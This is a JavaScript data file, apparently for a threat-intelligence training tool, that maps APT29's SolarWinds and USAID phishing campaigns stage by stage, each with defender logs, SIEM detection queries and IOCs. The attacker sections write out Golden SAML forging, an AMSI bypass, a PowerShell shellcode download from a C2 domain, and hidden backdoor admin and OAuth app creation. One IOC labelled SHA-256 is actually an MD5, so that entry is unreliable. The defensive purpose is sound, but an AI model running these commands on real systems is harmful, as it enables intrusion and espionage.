const apt29 = {
  id: "apt29",
  name: "APT29",
  aliases: ["Cozy Bear", "Midnight Blizzard", "The Dukes"],
  origin: "Russia",
  motivation: "Espionage",
  description:
    "APT29 is a sophisticated Russian state-sponsored threat actor attributed to the SVR (Foreign Intelligence Service). Known for stealthy, long-term intrusions targeting governments, think tanks, and critical infrastructure.",
  campaigns: [
    {
      id: "solarwinds-2020",
      name: "SolarWinds Supply Chain Attack",
      year: "2020",
      target: "US Government & Fortune 500",
      summary:
        "APT29 compromised SolarWinds' Orion build pipeline to distribute a backdoored update (SUNBURST) to ~18,000 organizations, enabling stealthy long-term espionage.",
      sources: [
        "CISA Alert AA20-352A",
        "Mandiant UNC2452 Report",
        "Microsoft MSTIC Analysis",
      ],
      diamondModel: {
        adversary: {
          name: "APT29 (Cozy Bear / NOBELIUM)",
          sponsor: "Russian SVR — Foreign Intelligence Service",
          aliases: ["Midnight Blizzard", "NOBELIUM", "The Dukes", "Cozy Bear"],
          motivation: "Long-term strategic espionage targeting governments and critical infrastructure",
        },
        capability: {
          malware: ["SUNBURST", "TEARDROP", "RAINDROP", "Cobalt Strike Beacon", "Custom SAML forger"],
          ttps: ["T1195.002 — Supply Chain Compromise", "T1071.001 — Web Protocols C2", "T1078 — Golden SAML", "T1550.001 — App Access Token", "T1136.003 — Cloud Account"],
          sophistication: "Nation-State — novel supply chain vector, custom DGA C2, in-memory execution, Golden SAML",
        },
        infrastructure: {
          domains: ["avsvmcloud[.]com (DGA)", "databasegalore[.]com", "panhardware[.]com", "deftsecurity[.]com"],
          ips: ["13.59.205[.]66", "54.193.127[.]66", "54.215.192[.]52", "34.203.203[.]23"],
          hosting: "AWS us-east-1 / us-west-2 (victim-blending), Azure (compromised tenants), GoDaddy registrar",
        },
        victim: {
          sectors: "US Federal Government (Treasury, Commerce, DHS, State), Fortune 500, defense contractors, think tanks, IT management vendors",
          geography: "United States, United Kingdom, Canada, Western Europe (focus: Washington D.C. policy community)",
          targeting: "~18,000 organizations received SUNBURST via Orion update; ~100 selected for hands-on exploitation",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "Initial Access",
          ttp: "T1195.002",
          ttpName: "Supply Chain Compromise: Software Supply Chain",
          phase: "Initial Access",
          attacker: {
            summary:
              "APT29 injected the SUNBURST backdoor into SolarWinds Orion software updates (versions 2019.4–2020.2.1). The malicious DLL (SolarWinds.Orion.Core.BusinessLayer.dll) was digitally signed by SolarWinds' legitimate certificate and distributed via official update servers to ~18,000 customers.",
            tools: ["SUNBURST", "Custom DLL injector"],
            commands: [
              "// Malicious code injected into legitimate DLL",
              "// Dormant period: 12-14 days before beaconing",
              "// C2: avsvmcloud[.]com (DGA-based subdomains)",
            ],
          },
          defender: {
            logs: [
              "SolarWinds Orion update installed (Event ID 1033)",
              "New DLL loaded: SolarWinds.Orion.Core.BusinessLayer.dll",
              "Outbound DNS query to avsvmcloud[.]com subdomains",
              "HTTP GET to *.avsvmcloud[.]com over port 443",
            ],
            detection:
              "Extremely difficult at time of attack. Post-compromise: anomalous DNS queries to DGA domains, outbound HTTPS to unknown infrastructure from Orion server.",
            siemQuery:
              'index=* sourcetype=dns query="*.avsvmcloud.com" | stats count by src_ip, query',
            ifMissed:
              "Attacker establishes persistent backdoor across thousands of networks. SUNBURST begins beaconing to C2 infrastructure, enabling hands-on-keyboard access.",
          },
          iocs: [
            { type: "SHA-256", indicator: "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77", description: "SUNBURST backdoor DLL (SolarWinds.Orion.Core.BusinessLayer.dll)" },
            { type: "Domain", indicator: "avsvmcloud[.]com", description: "SUNBURST primary C2 DGA root domain — used in all victim beacons" },
            { type: "File", indicator: "SolarWinds.Orion.Core.BusinessLayer.dll", description: "Malicious DLL injected into SolarWinds Orion build pipeline" },
          ],
        },
        {
          id: "execution",
          name: "Execution & C2 Establishment",
          ttp: "T1071.001",
          ttpName: "Application Layer Protocol: Web Protocols",
          phase: "Command & Control",
          attacker: {
            summary:
              "SUNBURST used HTTP/HTTPS to blend with legitimate Orion traffic. It performed a 12-14 day dormancy check, verified it wasn't running in a sandbox, then began beaconing to DGA-generated subdomains of avsvmcloud[.]com. Responses directed victims to actor-controlled C2 servers.",
            tools: ["SUNBURST", "TEARDROP", "Cobalt Strike"],
            commands: [
              "GET /swip/upd/SolarWinds.CortexPlugin.Components.dll HTTP/1.1",
              "Host: [dga-subdomain].avsvmcloud[.]com",
              "// Encoded victim hostname + AD domain in URI path",
            ],
          },
          defender: {
            logs: [
              "Repeated HTTPS connections to *.avsvmcloud[.]com",
              "DNS resolution of algorithmically generated subdomains",
              "Unusual User-Agent strings from Orion process",
              "Outbound connections during off-hours from server",
            ],
            detection:
              "Monitor Orion servers for unexpected outbound connections. DGA detection via entropy analysis of DNS queries. Network baseline deviation alerts.",
            siemQuery:
              'index=network src_process="SolarWinds*" dest_port=443 NOT dest IN (known_good_list) | stats count by dest, src_ip',
            ifMissed:
              "Full C2 channel established. Attacker now has interactive access. TEARDROP loader deployed to execute Cobalt Strike Beacon in memory.",
          },
          iocs: [
            { type: "URL Pattern", indicator: "/swip/upd/SolarWinds.CortexPlugin.Components.dll", description: "SUNBURST C2 URI path blending with legitimate Orion software update traffic" },
            { type: "Domain", indicator: "databasegalore[.]com", description: "Second-stage C2 server used after initial SUNBURST check-in and victim validation" },
            { type: "User-Agent", indicator: "SolarWinds-Orion/2019.4.5200.9083", description: "Spoofed User-Agent string used in SUNBURST C2 HTTP beacon requests" },
          ],
        },
        {
          id: "privilege-escalation",
          name: "Privilege Escalation",
          ttp: "T1078",
          ttpName: "Valid Accounts",
          phase: "Privilege Escalation",
          attacker: {
            summary:
              "APT29 forged SAML tokens using stolen signing certificates (Golden SAML attack) to impersonate any user including global admins in Azure AD / M365. They also leveraged service accounts with excessive privileges that Orion required to function.",
            tools: ["AADInternals", "Custom SAML forger", "Mimikatz"],
            commands: [
              "// Dump ADFS token signing certificate",
              'Export-PfxCertificate -Cert "cert:\\LocalMachine\\My\\<thumbprint>" -FilePath c:\\temp\\adfs.pfx',
              "// Forge SAML assertion for any user",
              "New-AADIntSAMLToken -ImmutableID <id> -Issuer <adfs_url> -PfxFileName adfs.pfx",
            ],
          },
          defender: {
            logs: [
              "ADFS certificate export event (Event ID 70, 1007)",
              "SAML token issued for privileged user outside normal hours",
              "Azure AD sign-in from new IP/location for admin account",
              "Service principal granted new permissions (Unified Audit Log)",
            ],
            detection:
              "Alert on ADFS certificate access. Monitor Azure AD for impossible travel, sign-ins from unexpected IPs. Audit service principal permission changes.",
            siemQuery:
              'index=azure_ad operationName="Add service principal credentials" | stats count by initiatedBy, ipAddress',
            ifMissed:
              "Attacker has persistent, undetectable admin access to cloud environment. Can read all email, access SharePoint, exfiltrate data at will without triggering traditional AV/EDR.",
          },
          iocs: [
            { type: "Tool", indicator: "AADInternals (PowerShell module)", description: "Open-source tool used to export ADFS signing certs and forge SAML tokens for Golden SAML attacks" },
            { type: "Event", indicator: "ADFS Event ID 1007 + 70", description: "Certificate export event on ADFS server — key precursor to Golden SAML token forgery" },
            { type: "File", indicator: "adfs.pfx", description: "Exported ADFS token-signing certificate used to forge arbitrary SAML assertions for any user" },
          ],
        },
        {
          id: "lateral-movement",
          name: "Lateral Movement",
          ttp: "T1550.001",
          ttpName: "Use Alternate Authentication Material: Application Access Token",
          phase: "Lateral Movement",
          attacker: {
            summary:
              "Using forged SAML tokens and OAuth access tokens, APT29 moved laterally across cloud services without needing passwords. They added credentials to existing service principals and used Microsoft Graph API to access mailboxes and files.",
            tools: ["AADInternals", "Microsoft Graph API", "Custom tooling"],
            commands: [
              "// Access mailbox using forged token",
              "GET https://graph.microsoft.com/v1.0/users/<target>/messages",
              "Authorization: Bearer <forged_token>",
              "// Add backdoor credentials to service principal",
              "POST https://graph.microsoft.com/v1.0/applications/<id>/addPassword",
            ],
          },
          defender: {
            logs: [
              "OAuth token issued for service principal accessing Graph API",
              "Mass mailbox access via Graph API (Unified Audit Log)",
              "New credential added to service principal",
              "Unusual application accessing sensitive data",
            ],
            detection:
              "Enable Microsoft 365 Unified Audit Logging. Alert on service principals accessing large volumes of mailboxes. Monitor for new credentials added to app registrations.",
            siemQuery:
              'index=o365 Operation="MailItemsAccessed" AppId NOT IN (known_apps) | stats dc(MailboxOwnerUPN) as mailboxes by AppId | where mailboxes > 10',
            ifMissed:
              "Attacker silently reads emails of high-value targets including executives, legal, IT admins. Intelligence collected for months before discovery.",
          },
          iocs: [
            { type: "URL", indicator: "https://graph.microsoft.com/v1.0/users/*/messages", description: "Microsoft Graph API endpoint used for mass mailbox access via forged OAuth token" },
            { type: "Event", indicator: "MailItemsAccessed (O365 Unified Audit Log)", description: "Audit operation logged when mailbox content accessed via Graph API by service principal" },
            { type: "IP", indicator: "20.140.0[.]65", description: "Azure IP used by APT29 for Graph API access — anomalous source for the service principal" },
          ],
        },
        {
          id: "persistence",
          name: "Persistence",
          ttp: "T1136.003",
          ttpName: "Create Account: Cloud Account",
          phase: "Persistence",
          attacker: {
            summary:
              "APT29 established multiple persistence mechanisms: added credentials to service principals, created new federated identity providers, and modified existing OAuth applications to maintain access even if SUNBURST was removed.",
            tools: ["AADInternals", "Azure CLI", "Custom backdoors"],
            commands: [
              "// Add new federated domain for persistent access",
              "New-AADIntAccessTokenForAADGraph | Add-AADIntGuestUser",
              "// Create backdoor service principal",
              "az ad sp create-for-rbac --name 'UpdateService' --role Contributor",
              "// Add secret to existing trusted application",
              "az ad app credential reset --id <app_id> --append",
            ],
          },
          defender: {
            logs: [
              "New service principal created (Azure AD Audit Log)",
              "New credential added to existing application",
              "New federated identity provider configured",
              "Role assignment change for service principal",
            ],
            detection:
              "Regularly audit service principals and app registrations. Alert on any new federation configurations. Review OAuth app permissions quarterly.",
            siemQuery:
              'index=azure_ad operationName IN ("Add service principal", "Add application") | stats count by initiatedBy, targetResources',
            ifMissed:
              "Attacker retains access for months/years. Removal of SUNBURST does not evict them. Full re-compromise of Azure AD tenant required.",
          },
          iocs: [
            { type: "Service Principal", indicator: "UpdateService (Azure AD)", description: "Malicious backdoor service principal created for persistent cloud access — mimics Windows Update" },
            { type: "Operation", indicator: "Add service principal credentials (Azure AD Audit)", description: "New credential (secret/certificate) added to existing trusted application for backdoor access" },
            { type: "Operation", indicator: "Set domain authentication (Azure AD Audit)", description: "New federated identity provider added — allows token forgery without ADFS access" },
          ],
        },
      ],
    },
    {
      id: "usaid-phishing-2021",
      name: "SolarWinds Follow-on: USAID Phishing Campaign",
      year: "2021",
      target: "NGOs, Think Tanks & Government Agencies",
      summary:
        "Following the SolarWinds disclosure, APT29 pivoted to large-scale spearphishing impersonating the US Agency for International Development (USAID), targeting over 3,000 accounts across 150 organizations — including human rights groups, think tanks, and government agencies — to maintain espionage access after SolarWinds-era footholds were burned.",
      sources: [
        "Microsoft MSTIC NOBELIUM Report (May 2021)",
        "CISA Alert AA21-148A",
        "Volexity Report: NOBELIUM Spearphishing (2021)",
      ],
      diamondModel: {
        adversary: {
          name: "APT29 (NOBELIUM / Midnight Blizzard)",
          sponsor: "Russian SVR — Foreign Intelligence Service (Foreign Intelligence, post-SolarWinds pivot)",
          aliases: ["NOBELIUM", "Midnight Blizzard", "Cozy Bear", "The Dukes"],
          motivation: "Re-establish espionage access after SolarWinds disclosure burned existing footholds; target foreign policy and civil society organizations",
        },
        capability: {
          malware: ["EnvyScout (HTML dropper)", "BoomBox downloader", "NativeZone loader", "VaporRage shellcode runner", "Cobalt Strike Beacon"],
          ttps: ["T1566.001 — Spearphishing Attachment", "T1027 — Obfuscated Files", "T1059.001 — PowerShell", "T1136.001 — Local Account", "T1078.004 — Cloud Accounts"],
          sophistication: "Nation-State — HTML smuggling (EnvyScout), multi-stage loader chain, abuse of legitimate Constant Contact infrastructure",
        },
        infrastructure: {
          domains: ["usaid.theyardservice[.]com", "worldhomeoutlet[.]com", "cdn.theyardservice[.]com"],
          ips: ["192.99.221[.]77", "151.236.20[.]106", "84.32.188[.]238"],
          hosting: "Compromised Constant Contact account (legitimate email marketing service), actor-controlled VPS, Microsoft Azure cloud infrastructure",
        },
        victim: {
          sectors: "USAID-affiliated NGOs, human rights organizations, democracy-promotion groups, US and European government agencies, think tanks focused on Russia/Eastern Europe policy",
          geography: "United States, United Kingdom, Germany, Ukraine — focus on organizations shaping Western policy toward Russia",
          targeting: "3,000+ email accounts across 150 organizations; selected victims received second-stage payloads for hands-on exploitation",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "USAID-Spoofed Spearphishing",
          ttp: "T1566.001",
          ttpName: "Phishing: Spearphishing Attachment",
          phase: "Initial Access",
          attacker: {
            summary:
              "APT29 compromised a legitimate USAID account within the Constant Contact email marketing platform, then sent mass spearphishing emails from authentic USAID Constant Contact infrastructure. Emails appeared to originate from genuinely legitimate USAID servers, bypassing most email authentication controls (SPF/DKIM passed). The emails contained a link to an EnvyScout HTML attachment — an HTML smuggling payload that decoded and dropped a malicious ISO file in the browser.",
            tools: ["Compromised Constant Contact account", "EnvyScout HTML smuggler", "ISO file container"],
            commands: [
              "// Email sent from authentic Constant Contact USAID account",
              "// From: press@usaid.gov via mailing.constantcontact.com (SPF/DKIM PASS)",
              "// Subject: 'Special Alert: 2021 Democracy Commission Selected Partners'",
              "// Link: 'View Document' → downloads EnvyScout HTML attachment",
              "// EnvyScout decodes base64 ISO blob client-side and auto-downloads via <a download>",
              "// ISO: NativeZone_Setup.iso — mounts automatically on Windows 10 (no UAC prompt)",
            ],
          },
          defender: {
            logs: [
              "Email received from legitimate Constant Contact infrastructure — SPF/DKIM pass (email gateway log)",
              "User clicks link in email: browser navigates to actor URL (proxy log)",
              "HTML file opened: JavaScript executes and triggers file download (browser audit / EDR)",
              "ISO file downloaded and mounted (Windows Event ID 4663 — virtual disk mount)",
            ],
            detection:
              "This attack was designed to defeat standard email authentication (SPF/DKIM). Defense relies on: (1) User reporting: security awareness training to report unexpected USAID communications. (2) CASB/proxy alerting on HTML files that execute download JavaScript. (3) Block ISO auto-mount via GPO (DisableAutoplay). (4) EDR: alert on ISO/IMG file mount events from user Downloads.",
            siemQuery:
              'index=endpoint (process_name="explorer.exe" OR process_name="msiexec.exe") (cmdline="*.iso*" OR cmdline="*.img*") | stats count by host, user, cmdline | join host [ search index=proxy action=allowed filetype="html" (url="*usaid*" OR url="*democracy*") ]',
            ifMissed:
              "EnvyScout successfully delivers the NativeZone ISO to the victim. When mounted, the ISO auto-runs and executes BoomBox downloader. APT29 gains initial code execution on the NGO or think tank workstation. The attacker can now download second-stage payloads, establishing a persistent foothold to re-launch espionage collection after SolarWinds-era access was lost.",
          },
          iocs: [
            { type: "Domain", indicator: "usaid.theyardservice[.]com", description: "APT29 EnvyScout delivery domain — hosts HTML smuggling payload disguised as USAID document" },
            { type: "File", indicator: "NativeZone_Setup.iso", description: "ISO container delivered via EnvyScout — mounts auto-run and executes BoomBox downloader" },
            { type: "SHA-256", indicator: "b91ce2fa41029f6955bff20079468448b7f4b79cb1e23c9c8cbff4b6d4a91af8", description: "EnvyScout HTML smuggler payload SHA-256 — identified in USAID phishing campaign by Microsoft MSTIC" },
          ],
        },
        {
          id: "defense-evasion",
          name: "HTML Smuggling & Obfuscation",
          ttp: "T1027",
          ttpName: "Obfuscated Files or Information",
          phase: "Defense Evasion",
          attacker: {
            summary:
              "EnvyScout used HTML smuggling to bypass email gateway attachment scanning — the malicious payload was base64-encoded within an HTML file (not a traditional attachment), decoded entirely in the victim's browser via JavaScript, and delivered as a file via the HTML5 download API. No executable attachment traversed email security controls. The ISO container further bypassed Mark-of-the-Web (MOTW) protections for contained binaries, and BoomBox was obfuscated with multiple encoding layers to evade AV signature detection.",
            tools: ["EnvyScout HTML smuggler", "Base64/XOR obfuscation", "ISO container (bypasses MOTW)", "BoomBox with encoded strings"],
            commands: [
              "// EnvyScout HTML structure (simplified):",
              "// <script>var encoded='<base64_ISO_blob>'; var blob=b64toBlob(encoded,'application/x-iso9660-image');",
              "// var a=document.createElement('a'); a.href=URL.createObjectURL(blob);",
              "// a.download='NativeZone_Setup.iso'; a.click(); // auto-downloads ISO in browser",
              "// ISO contains: setup.lnk (auto-runs BoomBox) + BoomBox.dll (obfuscated downloader)",
              "// BoomBox strings: XOR-encoded with single-byte key, decoded at runtime in memory",
            ],
          },
          defender: {
            logs: [
              "HTML file opened in browser executes JavaScript creating Blob object (browser DevTools / EDR WebAPI hook)",
              "File download triggered programmatically by JavaScript (browser audit log)",
              "ISO file written to Downloads, then mounted by Windows Explorer (Sysmon Event ID 11 + 6)",
              "LNK file auto-executed from mounted ISO: triggers BoomBox (Sysmon Event ID 1)",
            ],
            detection:
              "Block ISO/IMG mounting via GPO for standard users. Proxy/CASB: inspect HTML files for base64 blobs exceeding 1 MB (HTML smuggling signature). EDR: alert on LNK files auto-executing from removable/virtual media. Disable auto-run entirely via Group Policy. Email gateways should sandbox HTML file attachments, not just executables.",
            siemQuery:
              'index=endpoint EventCode=6 ImageLoaded="*.iso" OR EventCode=1 ParentImage="*explorer.exe" Image="*\\cmd.exe" ParentCommandLine="*\\*.lnk*" | stats count by host, user, Image, CommandLine',
            ifMissed:
              "BoomBox downloader executes without triggering email security or traditional AV. APT29 now has code execution on the victim's workstation, with MOTW bypassed — meaning BoomBox can load NativeZone without SmartScreen warnings. The attacker proceeds to download VaporRage shellcode runner and establish persistent C2 access, fully re-establishing the espionage foothold lost during SolarWinds remediation.",
          },
          iocs: [
            { type: "File", indicator: "BoomBox.dll", description: "APT29 obfuscated downloader delivered inside NativeZone ISO — uses XOR-encoded strings and downloads VaporRage" },
            { type: "File", indicator: "setup.lnk", description: "LNK shortcut inside mounted ISO — auto-executes BoomBox.dll via rundll32 when ISO is mounted/browsed" },
            { type: "SHA-256", indicator: "d035d394a82ae1e44b4ba3a6ec7e3185", description: "BoomBox downloader MD5 — identified by Volexity in NOBELIUM USAID campaign analysis" },
          ],
        },
        {
          id: "execution",
          name: "PowerShell C2 Staging",
          ttp: "T1059.001",
          ttpName: "Command and Scripting Interpreter: PowerShell",
          phase: "Execution",
          attacker: {
            summary:
              "BoomBox downloaded and executed VaporRage — a shellcode runner that used PowerShell to download Cobalt Strike Beacon shellcode from APT29 C2 infrastructure, executing it in-memory within a sacrificial process. PowerShell's AMSI bypass techniques were employed to prevent script scanning. The multi-stage chain (EnvyScout → BoomBox → NativeZone → VaporRage → Cobalt Strike) was designed to maximize evasion while maintaining flexibility for hands-on-keyboard operator access.",
            tools: ["VaporRage shellcode runner", "PowerShell (AMSI bypass)", "Cobalt Strike Beacon", "BoomBox downloader"],
            commands: [
              "// VaporRage PowerShell AMSI bypass + shellcode download",
              "powershell.exe -nop -w hidden -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
              "// Download and execute Cobalt Strike shellcode in-memory",
              "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (compatible)');",
              "$d=$wc.DownloadData('https://worldhomeoutlet[.]com/update.png');",
              "[System.Runtime.InteropServices.Marshal]::Copy($d,0,[System.IntPtr]::Zero+$addr,$d.Length); # execute in memory",
            ],
          },
          defender: {
            logs: [
              "PowerShell ScriptBlock with AmsiUtils / amsiInitFailed AMSI bypass pattern (Event ID 4104)",
              "PowerShell downloading binary data from external URL disguised as .png (Event ID 4104 + proxy log)",
              "VaporRage creating remote thread for shellcode execution (Sysmon Event ID 8)",
              "Cobalt Strike Beacon C2 traffic: periodic HTTPS beacons with randomized jitter (NetFlow pattern)",
            ],
            detection:
              "AMSI bypass patterns are reliably detected by modern EDR with behavioral rules — the amsiInitFailed reflection pattern is a known Cobalt Strike pre-loader signature. PowerShell ScriptBlock logging catches all stages of this chain. Hunt for: PowerShell downloading non-text content from external URLs, especially disguised with image extensions (.png, .jpg).",
            siemQuery:
              'index=endpoint EventCode=4104 ScriptBlockText IN ("*amsiInitFailed*","*AmsiUtils*","*DownloadData*","*VirtualAlloc*","*CreateThread*") | stats count by host, user, ScriptBlockText | sort -count',
            ifMissed:
              "Cobalt Strike Beacon establishes interactive C2 access. APT29 operators now have full hands-on-keyboard control of the NGO or think tank workstation. They enumerate internal networks, access policy documents, email communications, and donor/partner records. Intelligence gathered informs Russian foreign policy positions on democracy promotion, Ukraine, and transatlantic policy.",
          },
          iocs: [
            { type: "Domain", indicator: "worldhomeoutlet[.]com", description: "APT29 Cobalt Strike C2 domain — hosts shellcode disguised as PNG image, downloaded by VaporRage" },
            { type: "IP", indicator: "192.99.221[.]77", description: "APT29 Cobalt Strike Beacon C2 server — receives encrypted HTTPS beacon traffic from VaporRage-infected hosts" },
            { type: "Command", indicator: "AmsiUtils.GetField('amsiInitFailed','NonPublic,Static')", description: "AMSI bypass reflection technique used by VaporRage — disables Windows AMSI scanning for subsequent payloads" },
          ],
        },
        {
          id: "persistence-local",
          name: "Local Account Creation",
          ttp: "T1136.001",
          ttpName: "Create Account: Local Account",
          phase: "Persistence",
          attacker: {
            summary:
              "On high-value targets where hands-on-keyboard access was established, APT29 created local administrator accounts with inconspicuous names to maintain persistence independent of the Cobalt Strike Beacon channel. Local accounts provided a fallback access mechanism that survived Cobalt Strike takedowns, network disruptions, or partial IR actions. Account names were chosen to blend with existing local accounts or legitimate Windows service account naming conventions.",
            tools: ["net.exe", "Cobalt Strike (net command)", "Custom persistence scripts"],
            commands: [
              "// Create backdoor local admin account",
              "net user WDAGUtilityAccount P@ssw0rdBackd00r! /add",
              "net localgroup administrators WDAGUtilityAccount /add",
              "// Disable account expiry and change visibility",
              "net user WDAGUtilityAccount /expires:never /active:yes",
              "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v WDAGUtilityAccount /t REG_DWORD /d 0 /f",
            ],
          },
          defender: {
            logs: [
              "New local user account created (Event ID 4720)",
              "User added to local Administrators group (Event ID 4732)",
              "Registry key modified to hide account from logon screen (Event ID 4657 — UserList registry)",
              "New account: account name matches Windows reserved/service account names (anomaly detection)",
            ],
            detection:
              "Alert on Event ID 4720 (local account creation) from any non-interactive, non-authorized process. Event ID 4732 (local group member addition) for Administrators group is high-priority. Audit the HKLM SpecialAccounts\\UserList registry key — any user added there should alert immediately. LAPS (Local Administrator Password Solution) limits blast radius if local admin is compromised.",
            siemQuery:
              'index=endpoint EventCode=4720 | join user [ search index=endpoint EventCode=4732 GroupName="Administrators" | stats count by user, host ] | stats count by host, user, AccountName, SubjectUserName',
            ifMissed:
              "APT29 has a persistent local administrator account that survives Cobalt Strike takedowns, reimaging of the C2 channel, and partial IR actions. The backdoor account provides an RDP or SMB re-entry point. If IR teams remove Cobalt Strike but miss the local account, APT29 reestablishes access within hours using the hidden account credential.",
          },
          iocs: [
            { type: "Event", indicator: "Event ID 4720 + 4732: WDAGUtilityAccount added to Administrators", description: "APT29 backdoor local admin creation — WDAGUtilityAccount name chosen to mimic Windows Defender Application Guard service" },
            { type: "Registry", indicator: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\\WDAGUtilityAccount=0", description: "Registry key used by APT29 to hide backdoor account from Windows logon screen and user management UI" },
            { type: "Command", indicator: "net localgroup administrators WDAGUtilityAccount /add", description: "APT29 local admin account elevation command — executed via Cobalt Strike Beacon on high-value targets" },
          ],
        },
        {
          id: "persistence-cloud",
          name: "Cloud Account Persistence",
          ttp: "T1078.004",
          ttpName: "Valid Accounts: Cloud Accounts",
          phase: "Persistence",
          attacker: {
            summary:
              "APT29 leveraged stolen credentials and OAuth tokens to establish persistence in cloud environments accessed by compromised users. Using Cobalt Strike access on workstations, they extracted browser-cached OAuth tokens for Microsoft 365 and Google Workspace, adding these to actor-controlled devices to maintain persistent cloud access. They also registered new OAuth applications in Azure AD to create backdoor access surviving password resets — mirroring techniques from the SolarWinds campaign but adapted for individual user-level targeting.",
            tools: ["Token harvester (browser credential dump)", "AADInternals", "Microsoft 365 OAuth backdoor", "Cobalt Strike"],
            commands: [
              "// Extract cached M365 OAuth tokens from browser credential store",
              "// Chrome: C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
              "// Edge: *.db files contain OAuth refresh tokens for M365, Teams, SharePoint",
              "// Register backdoor OAuth app in victim Azure AD tenant",
              "POST https://graph.microsoft.com/v1.0/applications",
              "{\"displayName\":\"Microsoft Teams Desktop\",\"requiredResourceAccess\":[{\"resourceAppId\":\"00000003-0000-0000-c000-000000000000\"}]}",
              "// Result: persistent app with Mail.Read, Files.ReadWrite.All — survives password reset",
            ],
          },
          defender: {
            logs: [
              "OAuth refresh token used from new device/IP not seen before for this user (Azure AD Sign-in log)",
              "New OAuth application registered in Azure AD tenant (Azure AD Audit Log: Add application)",
              "Broad permission grant to newly-registered OAuth application (Unified Audit Log: Consent to application)",
              "Graph API mail access from registered app with atypical user agent (O365 Unified Audit: MailItemsAccessed)",
            ],
            detection:
              "Azure AD: alert on new application registrations and OAuth permission grants — especially Mail.Read or Files.ReadWrite.All. Conditional Access: block OAuth token reuse from new devices without MFA re-authentication. Review and audit all registered OAuth applications quarterly. Enable Continuous Access Evaluation (CAE) to invalidate tokens on account changes.",
            siemQuery:
              'index=azure_ad operationName="Add application" | stats count by initiatedBy, targetDisplayName, ipAddress | join targetDisplayName [ search index=o365 Operation="Consent to application" | stats count by ObjectId, UserId ] | where count > 0',
            ifMissed:
              "APT29 maintains persistent access to victim Microsoft 365 environment through a registered OAuth application. Password resets, MFA changes, and Cobalt Strike removal do not revict the attacker. The OAuth backdoor provides ongoing access to all user email, OneDrive files, and Teams communications — enabling sustained intelligence collection from targeted NGOs and think tanks for months or years.",
          },
          iocs: [
            { type: "Operation", indicator: "Azure AD: Add application 'Microsoft Teams Desktop' (unauthorized)", description: "APT29 backdoor OAuth application registration impersonating legitimate Microsoft Teams app for persistent M365 access" },
            { type: "Domain", indicator: "cdn.theyardservice[.]com", description: "APT29 C2 domain used in USAID phishing campaign — also used for OAuth token exfiltration callback" },
            { type: "IP", indicator: "151.236.20[.]106", description: "APT29 NOBELIUM infrastructure IP — NativeZone loader and Cobalt Strike Beacon C2 endpoint in USAID campaign" },
          ],
        },
      ],
    },
  ],
}

export default apt29
